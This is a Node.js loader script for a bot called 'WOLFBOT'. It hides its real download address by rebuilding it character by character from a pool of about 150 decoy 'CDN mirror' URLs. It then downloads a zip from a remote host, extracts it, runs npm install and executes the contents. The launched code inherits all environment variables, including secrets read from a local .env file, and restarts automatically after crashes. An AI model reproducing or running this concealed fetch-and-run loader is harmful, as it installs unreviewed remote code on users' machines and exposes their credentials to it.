import fs from 'fs';
import path from 'path';
import axios from 'axios';
import AdmZip from 'adm-zip';
import { spawn, spawnSync } from 'child_process';

// process.cwd() is used instead of fileURLToPath(import.meta.url) because
// obfuscators break import.meta — process.cwd() is safe and equivalent here
const __dirname = process.cwd();

// === PATHS ===
const TEMP_DIR    = path.join(__dirname, '.npm', 'xcache', 'core_bundle');
const EXTRACT_DIR = path.join(TEMP_DIR, 'core');

// === CDN MIRROR POOL ===
const _registry = [
  'https://api.wolf-core.net/v1/stream/XsxeiT8WyTLHUZwb3SnHsf7fBdFwSLCFN8U9D5X3CP8',
  'https://api.wolf-core.net/v1/stream/dLwb9AjspYNecvCVI0rBvVrx1N5Zlora4KfztDsYfFL',
  'https://api.wolf-core.net/v1/stream/31J4c1izTPHDe0wEHYUHsMObgfYiQnVMtvxHeDL0Snf',
  'https://api.wolf-core.net/v1/stream/Qqa9BaNvepv5WUct9E0NhgOvCKv7K8DJ8rsBIp5q1T7',
  'https://api.wolf-core.net/v1/stream/XUjHI32tujzYnTAJ0NBJrkK4W8sNHvNY711c1y191Oh',
  'https://api.wolf-core.net/v1/stream/gbNYH7fgnFK3FtEs7DlE9c3eDLOtOBlpTdQ3E4GtmB1',
  'https://api.wolf-core.net/v1/stream/OxYNpzb2InLyYKJ7PSvCNmMkfFxBThf4PgqWhOwUQIn',
  'https://api.wolf-core.net/v1/stream/nX2VXPmrlzB26BP57ERm2inKdILaM2XQPI0P0b1Mrmm',
  'https://api.wolf-core.net/v1/stream/RftOOYOvjyFi2FEH5ZNi4IY3NfKhX4pFUfKtt49zryI',
  'https://api.wolf-core.net/v1/stream/Lz4DlS3nFdthHANmMZKNNiwsHHNUAwXIqmjfftFS9Od',
  'https://api.wolf-core.net/v1/stream/gnsnEiMlXNhAi4GNxnSsxtnuGZA1sqNiWVh9hl5hkGP',
  'https://api.wolf-core.net/v1/stream/5Lqbf7ot8ZjaQc5460MIR01s0t2f1CQ8GMDoX8pLjbM',
  'https://api.wolf-core.net/v1/stream/Ys37C2TBl2ToUKnh1BII86J2GUGOO0Puqd6wfA2Q9y7',
  'https://api.wolf-core.net/v1/stream/5bT3lUjMtAvms6tHneGN7dkGAJCdgn3AsQNs6DzK1AD',
  'https://api.wolf-core.net/v1/stream/0bHSUsjezwTIkTs4FXxaKIdxvO1YtOt3m5VWOY8seNX',
  'https://api.wolf-core.net/v1/stream/VzTZ0pViFW7wXfWEvYx4usj2PylGiUBa6vXCrkebBSv',
  'https://api.wolf-core.net/v1/stream/4reqOogvUo2WxFKCzih5lE7N1D42P22atimI354FwS5',
  'https://api.wolf-core.net/v1/stream/Q0emA7ustl5QZlQy0yjrlbEcrVnVwwJHqjLnLArRQTN',
  'https://api.wolf-core.net/v1/stream//rSRG8G9UcFvMoABtsQnceKAViUBKZvh53xCpJ/DGsi',
  'https://api.wolf-core.net/v1/stream/bQ7NvDhrFhuVzXG8MyYh2LBghgpbf4naogMbYRBDHVW',
  'https://api.wolf-core.net/v1/stream/NJeIfB3MjnnXNpcSGjh59991Pp7eRcYi1ppRUxZ2xqb',
  'https://api.wolf-core.net/v1/stream/cMwpHDvWo1NjTXxK9tgH71e3VeDk2skIDJRzp9At0Yc',
  'https://api.wolf-core.net/v1/stream/G2rIWl9ezO1BJSdXVQgZmTr089TEKcf9mnOAZomhvJk',
  'https://api.wolf-core.net/v1/stream/k53Nt0UPNmQvlgvKGm8u8ZXK5SdpsQnuctvkTlc4Qcd',
  'https://api.wolf-core.net/v1/stream/ePbtv5s7vSRRDCCs46L6QwhQbyBSoHMeTaYix0CLo7m',
  'https://api.wolf-core.net/v1/stream/bsMJ18ZwhGeggMbAXDaQBfUouvV3dCESEvh0Lz4RIcH',
  'https://api.wolf-core.net/v1/stream/8oknl3r91FHd5IYxXszWNSbIfOqdo8l0mURHvoxvETS',
  'https://api.wolf-core.net/v1/stream/HbLH5ritvT4M3Cyv5rhuW2s3CllTyHXjKJaZGEJbDjo',
  'https://api.wolf-core.net/v1/stream/YC1u67c5YEcdCTPq2zlizF5jqifKf3YgTg34IKdspCt',
  'https://api.wolf-core.net/v1/stream/41mvvo8GKvzFUvgYHsEZ3rWW0pQA2fgwERIseooKNyh',
  'https://api.wolf-core.net/v1/stream/Ajui4ld9y0jrRw72DoxmVgH1NPNu8548yR0PMU7D8k3',
  'https://api.wolf-core.net/v1/stream/17HqSQgFOR77BklEq1CegzipJNypGxBZlALsHNZpPFH',
  'https://api.wolf-core.net/v1/stream/P0X2YYkA1HSdFHxMgMba6q5DaQrI6TogQ4zPSt6KmT1',
  'https://api.wolf-core.net/v1/stream/wMXgHm3gbHB0Q2hRC4y2YKbb6eeFF5ViCPMojSpdB9o',
  'https://api.wolf-core.net/v1/stream/toKUOySIfyeKuvnxmMShszMbTm4RMIyoYXLbQOhCc7m',
  'https://api.wolf-core.net/v1/stream/iFIEWKy5Qpar9VaMy2VvkozWjKQYLl5Ro2N7FdgooHW',
  'https://api.wolf-core.net/v1/stream/6I5oKFPGKItwMMpFAnD38aSXBWglWNt05jrP7Ms2TEI',
  'https://api.wolf-core.net/v1/stream/9ShdnXOus7wI7bYYgeRKa2cm3Mt7DRirRfzk80iQVOG',
  'https://api.wolf-core.net/v1/stream/HRcWPKU3GAAabpVTMrElslxILN4xwSvmmWB:7Ahfv6O',
  'https://api.wolf-core.net/v1/stream/bzku0RpPC5TivCK8Uq41LsMU4sbgw8mMokVD2tIJoBK',
  'https://api.wolf-core.net/v1/stream/tVW5W67HxFVasrKtpEItRjGxyU9VoyUsjbmZ9DRu4iS',
  'https://api.wolf-core.net/v1/stream/aZJeCAkHcCVZiLDek4VxCteEXSA3sV1qc5BEM1SWEce',
  'https://api.wolf-core.net/v1/stream/LjM7dMFB73U5pVJW68kwqJdFKqXFeeqFJPuG9AGAdye',
  'https://api.wolf-core.net/v1/stream/6JDLjKQWjI2oaMocwCBUFUrn5R6PadDwssMoxsI9nqF',
  'https://api.wolf-core.net/v1/stream/c42i3oY9cqOfG8DL6cK29ReerZVcIw3r5ufOKTBKCLU',
  'https://api.wolf-core.net/v1/stream/Y3epQY6xPBaPo8i71MwsSM4d8FK1vsblfiEowb6Qt33',
  'https://api.wolf-core.net/v1/stream/tH4P9QUjCmgRf32jjoAui2Uo0uaMrqPkTMNGIomos4j',
  'https://api.wolf-core.net/v1/stream/1CMQCBzIvDn0wpzf56UgySypmmqEeWXH9apFaDHZ3pO',
  'https://api.wolf-core.net/v1/stream/68iXaIihkpBxJO4EYrsCrgKfGjOwWgOvXeLYRC5nfo9',
  'https://api.wolf-core.net/v1/stream/IcHWVjuG9jqqusggVZVo9rfArPViiUwd2xcn9G0VNtF',
  'https://api.wolf-core.net/v1/stream/piM0gJisyT50XeByQBh9h0Ybju3f4DqtPm1kI0W2XTM',
  'https://api.wolf-core.net/v1/stream/B5sj1TiNwC9NpzAVwI2q4qgPlPPhxXocFHZNZPKTC50',
  'https://api.wolf-core.net/v1/stream/gwedhLlblzicPjrFac11snYWYP9bnCkMk77ABSzfJcZ',
  'https://api.wolf-core.net/v1/stream/9PXx0DqL496kB7tAKfHA6TkZSAekVAmrgTYzUsljMOs',
  'https://api.wolf-core.net/v1/stream/wKlEsZhqSI04BeJLKrqX9RZJsFVk4tjMa9HgIusMFQV',
  'https://api.wolf-core.net/v1/stream/JfDjv1uU6hJ1RVAMoOsXCvpizZrcaQMoEsiXgMwQ8N5',
  'https://api.wolf-core.net/v1/stream/Wvx7rF50PeFZCvDruTDHEAPKIt5oVhslrwKB9zUAUEQ',
  'https://api.wolf-core.net/v1/stream/x6YyagMKkxnlvkvSpbREL6JEWyG7vqMMmEaR4Ez3Cla',
  'https://api.wolf-core.net/v1/stream/Dzg2nGLVCLfByNJLPPIkvGPGrORwn1mh5OlA9mzd8bS',
  'https://api.wolf-core.net/v1/stream/8K55O47X6VMLGPQnvvFEl5zy9FLxsNUH6DAn1hogp8a',
  'https://api.wolf-core.net/v1/stream/d6jlZSYlVI42DRvt8H23oEqq5uCMZwOAxRXKcT0krjE',
  'https://api.wolf-core.net/v1/stream/YGui8ewzCdfroNworUumRwsp3gChji4xkO1ECd3Twlz',
  'https://api.wolf-core.net/v1/stream/KOu1Aw32bqhgKxX74T8B1oH2uMG0lAdqAqals6RDAQ8',
  'https://api.wolf-core.net/v1/stream/upA0ex2ivzVkxiajslcJjqGfdFX6EOVGEICv9rL3hWy',
  'https://api.wolf-core.net/v1/stream/VOGTjqQRTHm1ZNTjYuPzAjwmlerOh7TUsO2A8tozRRZ',
  'https://api.wolf-core.net/v1/stream/HQKTXk3lPQgEGaI8LWmKGuKv75ydykaVTlHKy0yRS73',
  'https://api.wolf-core.net/v1/stream/sR1qM91J4NEKyWagzdKDFEWrmWZxgCZElW7KSO33Rxd',
  'https://api.wolf-core.net/v1/stream/zqGuXU84h9BDxI2Whuixbhko2LIkJnHcUSdRZZI20IN',
  'https://api.wolf-core.net/v1/stream/zOjiPOW6OPdN7ulSqe1lUsbCXZHafzWnthJpxT6c6kp',
  'https://api.wolf-core.net/v1/stream/e8fvoLvLU8eWugyZorIQ7xfEhqllu0Or6ljjem9bkME',
  'https://api.wolf-core.net/v1/stream/inEFRN5BMULUuABxQGUkoiqkBFNgWf1xVedl7ceJ1uo',
  'https://api.wolf-core.net/v1/stream/JDxpx9TQI4N8WCWFVKqhKMCYzZhM7YxPCK3fJDM1TwF',
  'https://api.wolf-core.net/v1/stream/LNDHVU36HO7iW3NtTRZNq5GinPXpNL7tXOd9yHxct9k',
  'https://api.wolf-core.net/v1/stream/041UFHg6p8RCVzde6iQWcVNUToAlBsW5C58viTADS9I',
  'https://api.wolf-core.net/v1/stream/Wfq0JcJCse0Qaq3avPah2Nu1bCzd0VSMU6NpGkMuT7B',
  'https://api.wolf-core.net/v1/stream/t6BbdMknMAQsB0k9ziT5037fmMZ0bczMSd9wxUGFnp0',
  'https://api.wolf-core.net/v1/stream/TmHYSfAgDiuL390aVHn7DJaFwC8nGPgvuUTuhqfjBny',
  'https://api.wolf-core.net/v1/stream/0roMV91EzWvumsbpYxG3LGoudsljzPIQI6YCZfgKs4y',
  'https://api.wolf-core.net/v1/stream/aY1ShvTfGWLnegLTKs1vr0ePFTQ2AxwoG42iOv9f5vU',
  'https://api.wolf-core.net/v1/stream/sBaZBKVBRIrBYMTysBMqQFEeiqIJcXlsRzLSVhdnKmd',
  'https://api.wolf-core.net/v1/stream/DR1LRd9iOVMRskZEOPWFaAJ8JkWA5OOFPCbP61VmKyK',
  'https://api.wolf-core.net/v1/stream/PXzwqVPcgcg4XPaPO9UstBfxanBlUwIfpytIE8BPRo2',
  'https://api.wolf-core.net/v1/stream/KNiitSbgKB2HqCu89tgXpIqZivfvIHEfUjdFcCcfIwV',
  'https://api.wolf-core.net/v1/stream/pNHQCEHef0YIEq3gU44PkLE3cU2rSKttFji3yUS38Sf',
  'https://api.wolf-core.net/v1/stream/FVaMsU0yuj85VRibKb2TKIoFfYNs9I4yiYDxLmCiAFK',
  'https://api.wolf-core.net/v1/stream/pNKFmNgbTCRrsMeOPE6mpcq0E4yKJb0f6g4DGDZ22Gu',
  'https://api.wolf-core.net/v1/stream/VBq6vpJWlyttoX3iBNOzaifOTCcyzmVcXKDsEq5RvSA',
  'https://api.wolf-core.net/v1/stream/2VaSRfqbD7WKg9tfoeZOP8eIhWES3bAd8dkXm6D0QvW',
  'https://api.wolf-core.net/v1/stream/AoEGljLlYVo2W1DVfg4bPRKd3b1pMSyxeHB0QWWacky',
  'https://api.wolf-core.net/v1/stream/FhuWMiS2Sz9l95KYBBu1UTvtdw5iSKwOonJve62O9hT',
  'https://api.wolf-core.net/v1/stream/l0YQUuzBuU5bN09nh4Np4bLon6zcFDnpBPtexRcihSG',
  'https://api.wolf-core.net/v1/stream/BCI60h2hfibBn6bU1fpbV6A5AXN1Q3KwuX27ROlQoO3',
  'https://api.wolf-core.net/v1/stream/YWzsCIsVRlJqm8kxss4nqlqG5ooHy8h235YcOs88AHJ',
  'https://api.wolf-core.net/v1/stream/4RptsuypZgEcB6HMfbCrTTOTWy0SXZYlDAikXkpynEL',
  'https://api.wolf-core.net/v1/stream/c0d596lWETqwiTTIgsosCJGcTg4G9r1x4Uup6ov3iRs',
  'https://api.wolf-core.net/v1/stream/og3a7EFuxIea1jzxlr67vjd0ccNvSdDXUSxyVb8ARot',
  'https://api.wolf-core.net/v1/stream/Gpw8oMk7pLgDVKs5kaAEbHYFgW9Hg3qqPqfo9D-v6Hl',
  'https://api.wolf-core.net/v1/stream/2rRFkG8zM8Ieh1KNijGjpCnhGzl3i1JJY0S8UNs38xN',
  'https://api.wolf-core.net/v1/stream/o0soJPrTS07mzA58sfiVrDRNUlF8SqbXK7uNOvnKCig',
  'https://api.wolf-core.net/v1/stream/vEdpGi9s033zE9R.Ebk77RigXT5LiA0eb1Z2aZ2wNNc',
  'https://api.wolf-core.net/v1/stream/JJsVCP4huf7D1sik6FRHf0WUneMJ5bkkqr5Kiu9Q0Po',
  'https://api.wolf-core.net/v1/stream/gRYMYJLbZ7myynoiZIUF9Ue4LAGV8FSLUujBervB2UA',
  'https://api.wolf-core.net/v1/stream/dANrDfX1CZgQO9TK5g6Q0AF6CNm8vVrvn0Fr4XmZ9Ua',
  'https://api.wolf-core.net/v1/stream/3AhMfY4gwiez.E1RiRP7RBJhEULfc4rVvFgQTwvcyrs',
  'https://api.wolf-core.net/v1/stream/5A00pzgx4E21cOw6ykLfq0cigla31jEemjn2gw53JhZ',
  'https://api.wolf-core.net/v1/stream/k3Ld2by71Zd5F56ZjeHR97Sbx0uhES1FUIsaOjoxQUW',
  'https://api.wolf-core.net/v1/stream/1W68p0o5nbopFqYAC9qQ5nJOabtwQUkHPzgMNUirvvQ',
  'https://api.wolf-core.net/v1/stream/m7fVr1uPq5qGUWv0oipopv6EPNFfx4a9pAisdta6hbW',
  'https://api.wolf-core.net/v1/stream/h1PJ0t6yzjRNrM87nzTZNqjyDXX3EWHsx4sPESdpXCY',
  'https://api.wolf-core.net/v1/stream/aYSTATWYv91zNOPwhlnImMEmCCa8mcByC9eri93wqGT',
  'https://api.wolf-core.net/v1/stream/fxflQslYOJYJiVIIUuWTcfUKWoAUwa9FfOz6taIycua',
  'https://api.wolf-core.net/v1/stream/MKUPSVz7iQy6MhvhZGeyUDSkCC2JIL0qLvUODylqH17',
  'https://api.wolf-core.net/v1/stream/WRC4qwigWOSkPNQS57TMXE7NO6p452LzLQwfFjqy5wl',
  'https://api.wolf-core.net/v1/stream/kwvuTAC9F0l2nkXAZCKY0IzIZGQ8KWlSnOC1UpHMWpu',
  'https://api.wolf-core.net/v1/stream/eGwLN0bfuBTw4xuDd4IS8zk10a5OE6bgYW8rCQKN75f',
  'https://api.wolf-core.net/v1/stream/YevOAtq83793eHYctf7ullcBxGJKaJcOhlIdlihBY30',
  'https://api.wolf-core.net/v1/stream/WaopXmT9G95Fih8PaNE5ZJafVRIl8jIDVZYfkfK4nNM',
  'https://api.wolf-core.net/v1/stream/7H3vvllu4lfvYY7MyKXZ87KmuPfCM9MKWCGBUElQqWV',
  'https://api.wolf-core.net/v1/stream/4EZ24W0d0qNaKaS0WaloYZmUoYXrNoavPgjKiOyOD7o',
  'https://api.wolf-core.net/v1/stream/cbTd85wMQ64EMOJTMZuL9kw4iryzTqLeWw5fKRdTiqW',
  'https://api.wolf-core.net/v1/stream/FM2QFAkzvzlVrsqwBAKv0pkQYFwIMsNPpdPA6TgK6oE',
  'https://api.wolf-core.net/v1/stream/8xtpqZYGRz0olNpnlZCLAWDduXi20th1fV5lNGD4FKy',
  'https://api.wolf-core.net/v1/stream/DiImBosHfeClNA3sn2rWfnBChMwsEvwwz3DrYlPOrJb',
  'https://api.wolf-core.net/v1/stream/1euokRs2vEl7Uk6vTcf93LOjhJiEih2ZO2MVECHNDkr',
  'https://api.wolf-core.net/v1/stream/Wd01rR1mLNEcIQuCxi7oxukZWFCn45p8U5MrsLzu25v',
  'https://api.wolf-core.net/v1/stream/mmu3kishBsssNEbQkWLFOYne1yZLNAtq6srcpv9dsRD',
  'https://api.wolf-core.net/v1/stream/J2ljPiUbDhtUa8p0FAspd89G7lfTXhgforPfMcxwJ4L',
  'https://api.wolf-core.net/v1/stream/bhGkJ473qj2URFD.bskdeppqxoOnJdbpLdRUjGslzRR',
  'https://api.wolf-core.net/v1/stream/cAxdfGcTB3a3paNWuJq7XsDfTaAIJxeASPv5pvhTnxU',
  'https://api.wolf-core.net/v1/stream/477tiJiO4v5cln749dUsjcPTqvSwp2swQR9hZ6dDWgl',
  'https://api.wolf-core.net/v1/stream/2NtvA4gjOPMULjRbGeezsD8aVeXCFY0qsV5h900pt4w',
  'https://api.wolf-core.net/v1/stream/sV9er2T1SQ37vfPKsf2STUO8jWfDchqDfKizQ1dDqW1',
  'https://api.wolf-core.net/v1/stream/91ogmrGVa6gPtCxV1ZgMwxzkn96wGBVzQcm0RLAGcRQ',
  'https://api.wolf-core.net/v1/stream/dPmuYSdBFbgEIJVJfjsNYZopsKo4eqMeFL4U88QvEx6',
  'https://api.wolf-core.net/v1/stream/s5TMkjL7LlP4coHsH9eiWYFgTAonuDNzLFAigq1k7Fr',
  'https://api.wolf-core.net/v1/stream/qzZYdUTcCGdbo4ulSbc2NmBOH1FyISb5xapL8K6ELW0',
  'https://api.wolf-core.net/v1/stream/gm03L7pLk0dUO1akUZwDjstp4znRajY1BQnCtGxHe8K',
  'https://api.wolf-core.net/v1/stream/kCvqi3LV5Li9E18ufDsy6wW3eqsgEa2ie6bDx46spdU',
  'https://api.wolf-core.net/v1/stream/gxuUigrUtI4XZGjLuGdnB6Af8wlLb4vFN3gTyB1TfQG',
  'https://api.wolf-core.net/v1/stream/sqNf99-7uA/jY9RvZySsrM2jio6xVYnk3BjFpe1HzSA',
  'https://api.wolf-core.net/v1/stream/bMDzXSMmZI9TKqQs6AxgGdWf19oMeoSy309rtfpHCkg',
  'https://api.wolf-core.net/v1/stream/C34pGS4eLBZVz8vdiyhaQC0XsYeyx4ZxGvc4soLxG2U',
  'https://api.wolf-core.net/v1/stream/DSQ33oiuKqxdjErTAdaqPGQGkPNjlnUZARIpFE306dz',
  'https://api.wolf-core.net/v1/stream/I9jgECKflpu7aiNONBuPNZ202rnw3RPCq2o0plNaejp',
  'https://api.wolf-core.net/v1/stream/nToY68IL4G2poh2rsxhFnAc9JmiFjqc5JvieeJi4Sy8',
  'https://api.wolf-core.net/v1/stream/orwTh8cIOfDZoxYT1X3W7kWVMQP3P9KAmNJnDCfG88U',
  'https://api.wolf-core.net/v1/stream/ZbkFWsk70iXdEN6nGgPExWj6C3shX5YhmH177up8w8d',
  'https://api.wolf-core.net/v1/stream/mFA9FZ2fBBp33Dt8v1HdtW7KorBwEtrX5oWoSYn45gM',
  'https://api.wolf-core.net/v1/stream/2oRR7tc2nyrmIv7n4HvlVDWLUZStKMrR6lS6SE7vv0p',
  'https://api.wolf-core.net/v1/stream/ZYlYgIPEwNtmRP0uzwB01oytLn5SWpkA0LiE2KUvirx',
];

const _BUILD_REF = 'f3a91b4e-7c2d-4e8f-b6a0-1d5e92c74f38';

function _resolveEndpoint(pool, ref) {
  const _n = ref.length ^ ref.length;
  const _k = [13035,8331,3237,10604,220,3835,1838,1800,14134,6112,13816,5526,4011,10334,3325,13512,3412,1201,9638,4733,14819,3338,11622,8324,11528,13906,3904,4142,13438,2417,6218,9938,10312,1001,10934,315,12010,8203,11517,8842,9915,13023,4723,12836,13910,6940,14206,9435,12715,13629,3921,11025,14808];
  return _k.map(v => pool[Math.floor(v / 100)][(v % 100 + 36 + _n) | 0]).join('');
}

const CONFIG_URL         = _resolveEndpoint(_registry, _BUILD_REF);
const LOCAL_SETTINGS     = path.join(__dirname, 'settings.js');
const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, 'settings.js');
const ENV_FILE           = path.join(__dirname, '.env');

const delay = (ms) => new Promise((res) => setTimeout(res, ms));

const C  = '\x1b[32m';
const R  = '\x1b[0m';
const RD = '\x1b[31m';
const YL = '\x1b[33m';

function log(msg)  { console.log(`${C}${msg}${R}`); }
function err(msg)  { console.error(`${RD}${msg}${R}`); }
function warn(msg) { console.log(`${YL}${msg}${R}`); }

process.stdout.write(`${C}
┌──────────────────────────────────┐
│   🐺 WOLFBOT v1.1.5              │
│   Loader  : initializing...      │
└──────────────────────────────────┘
${R}`);


// === ENV LOADER ===
// Reads .env and injects variables into process.env (skips already-set keys).
function loadEnvFile() {
  if (!fs.existsSync(ENV_FILE)) return;
  try {
    for (const line of fs.readFileSync(ENV_FILE, 'utf8').split('\n')) {
      const t = line.trim();
      if (!t || t.startsWith('#')) continue;
      const eq = t.indexOf('=');
      if (eq !== -1) {
        const k = t.substring(0, eq).trim();
        const v = t.substring(eq + 1).trim().replace(/^["']|["']$/g, '');
        if (!process.env[k]) process.env[k] = v;
      }
    }
  } catch {}
}

// === CONFIG FETCHER ===
// Fetches kip.json. Response is malformed JSON: ["repo":"https://...zip"]
// Standard JSON.parse fails, so a regex fallback extracts the zip URL.
async function fetchRepoUrl() {
  const res = await axios.get(CONFIG_URL, {
    timeout: 15000,
    responseType: 'text',
    headers: { 'User-Agent': 'wolf-fetcher/1.0' }
  });

  const raw = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

  try {
    const parsed = JSON.parse(raw);
    const url = parsed?.repo || parsed?.[0]?.repo;
    if (url) return url;
  } catch {}

  // Regex fallback — handles ["repo":"https://..."] malformed format
  const match = raw.match(/"repo"\s*:\s*"([^"]+)"/);
  if (match?.[1]) return match[1];

  throw new Error(`Could not extract repo URL from response: ${raw.slice(0, 200)}`);
}

// === DOWNLOAD & EXTRACT ===
// Downloads the bot zip, extracts it, renames the top folder to EXTRACT_DIR.
// Skips only if EXTRACT_DIR exists AND contains a valid entry file.
async function downloadAndExtract() {
  const _entryExists = ['index.js', 'main.js', 'bot.js', 'app.js']
    .some(f => fs.existsSync(path.join(EXTRACT_DIR, f)));

  if (fs.existsSync(EXTRACT_DIR) && _entryExists) {
    if (!fs.existsSync(path.join(EXTRACT_DIR, 'node_modules'))) {
      spawnSync('npm', ['install', '--no-audit', '--prefer-offline'], { cwd: EXTRACT_DIR, stdio: 'ignore' });
    }
    return;
  }

  // Directory exists but entry file is missing — wipe and re-download
  if (fs.existsSync(TEMP_DIR)) {
    fs.rmSync(TEMP_DIR, { recursive: true, force: true });
  }
  fs.mkdirSync(TEMP_DIR, { recursive: true });

  const zipPath = path.join(TEMP_DIR, 'bundle.zip');

  const repoUrl = await fetchRepoUrl();

  const response = await axios({
    url: repoUrl,
    method: 'GET',
    responseType: 'stream',
    timeout: 120000,
    maxRedirects: 10,
    headers: { 'User-Agent': 'wolf-fetcher/1.0' }
  });

  await new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(zipPath);
    response.data.pipe(writer);
    writer.on('finish', resolve);
    writer.on('error', reject);
  });

  // Reject if too small — likely a 404 HTML page
  const stat = fs.statSync(zipPath);
  if (stat.size < 1000) {
    const preview = fs.readFileSync(zipPath, 'utf8').slice(0, 300);
    throw new Error(`Download too small (${stat.size}B) — possibly a 404 or auth wall:\n${preview}`);
  }

  try {
    const zip = new AdmZip(zipPath);
    zip.extractAllTo(TEMP_DIR, true);
  } finally {
    if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
  }

  // GitHub zips extract as 'repo-branch/'; rename it to 'core'
  const items = fs.readdirSync(TEMP_DIR).filter(f =>
    fs.statSync(path.join(TEMP_DIR, f)).isDirectory() && f !== 'core'
  );
  if (items.length > 0) {
    fs.renameSync(path.join(TEMP_DIR, items[0]), EXTRACT_DIR);
  }

  if (!fs.existsSync(EXTRACT_DIR)) {
    throw new Error('Extraction completed but core directory was not found.');
  }

  spawnSync('npm', ['install', '--no-audit', '--prefer-offline'], { cwd: EXTRACT_DIR, stdio: 'ignore' });
}

// === SETTINGS SYNC ===
// Copies local settings.js into the extracted bot folder to override defaults.
async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS)) return;
  try {
    fs.mkdirSync(EXTRACT_DIR, { recursive: true });
    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
  } catch {}
  await delay(300);
}

// === BOT LAUNCHER ===
// Finds the bot directory, spawns it as a child process, auto-restarts on crash.
function startBot() {
  let botDir = fs.existsSync(EXTRACT_DIR) ? EXTRACT_DIR : null;

  if (!botDir) {
    for (const dir of [
      path.join(__dirname, 'core'),
      path.join(__dirname, 'bot'),
      path.join(__dirname, 'src')
    ]) {
      if (fs.existsSync(dir) && fs.existsSync(path.join(dir, 'index.js'))) {
        botDir = dir;
        break;
      }
    }
  }

  if (!botDir) {
    err('❌ No bot directory found. Cannot start bot.');
    err('   Ensure the download succeeded or place bot files in a "core" folder.');
    process.exit(1);
  }

  let mainFile = 'index.js';
  for (const file of ['index.js', 'main.js', 'bot.js', 'app.js']) {
    if (fs.existsSync(path.join(botDir, file))) { mainFile = file; break; }
  }

  log('🚀 Starting bot...');

  const bot = spawn('node', [mainFile], {
    cwd:   botDir,
    stdio: 'inherit',
    env:   { ...process.env }
  });

  bot.on('close', (code) => {
    if (code !== 0 && code !== null) {
      warn(`⚠️ Bot exited (code ${code}). Restarting in 3s...`);
      setTimeout(() => startBot(), 3000);
    }
  });

  bot.on('error', (e) => {
    err(`❌ Failed to start: ${e.message}`);
    setTimeout(() => startBot(), 3000);
  });
}

// === ENTRY POINT ===
(async () => {
  loadEnvFile();
  try {
    await downloadAndExtract();
    await applyLocalSettings();
  } catch (e) {
    err(`❌ Setup failed: ${e.message}`);
    err('   Attempting to start from existing files...');
  }
  startBot();
})();
